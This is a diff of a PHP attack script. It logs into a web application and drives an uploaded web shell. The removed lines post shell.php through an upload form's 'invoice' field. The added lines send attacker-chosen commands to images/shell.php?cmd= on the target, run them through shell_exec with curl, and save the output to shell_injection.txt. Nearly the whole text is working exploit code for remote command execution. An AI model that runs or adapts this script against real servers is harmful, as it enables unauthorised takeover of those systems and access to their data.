@@ -30,9 +30,6 @@ define('USERNAME', $username);
 //The password of the account.
 define('PASSWORD', $password);
 
-//Upload file
-$shellPath = $argv[3];
-
 //An associative array that represents the required form fields.
 //You will need to change the keys / index names to match the name of the form
 //fields.
@@ -41,11 +38,6 @@ $loginValues = array(
     'mypassword' => PASSWORD
 );
 
-$shellValues = array(
-    'invoice' => '@'.realpath($shellPath),
-);
-echo "Start Login Web Server.\n";
-echo "Username:", $username, "Password:", $password, "\n";
 
 //Initiate cURL.
 $curl = curl_init();
@@ -93,26 +85,21 @@ if(curl_errno($curl)){
 	echo "Successful Login!\n";
 }
  
+$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
+$shellcmd = $argv[3];
+echo $cmd.$shellcmd; 
+$result = shell_exec ($cmd.$shellcmd);
+$result_txt = "-------------------------------------------------------------\n".
+			"Now running the shell command '" . $shellcmd . "' on web server.\n".
+			"Result:\n".
+			"----------------\n".
+			$result;
+			
+echo $result_txt;
 
-//We should be logged in by now. Let's attempt to access a password protected page
-curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'upload.php');
+$resultfile = fopen("shell_injection.txt", "w") or die("Unable to open file!");
+fwrite($resultfile, $result_txt);
 
-//Tell cURL that we want to carry out a POST request.
-curl_setopt($curl, CURLOPT_POST, true);
- 
-//Set our post fields / date (from the array above).
-// curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($shellValues));
-curl_setopt($curl, CURLOPT_POSTFIELDS, $shellValues);
-
-//Tells cURL to return the output once the request has been executed.
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
-
-//Execute the POST request and print out the result.
-curl_exec($curl);
-
-
-$cmd = "curl -F 'invoice=@shell.php' ". IP_ADDRESS . "upload.php";
-$result = shell_exec ($cmd);
-
+fclose($resultfile);
 
 curl_close($curl);
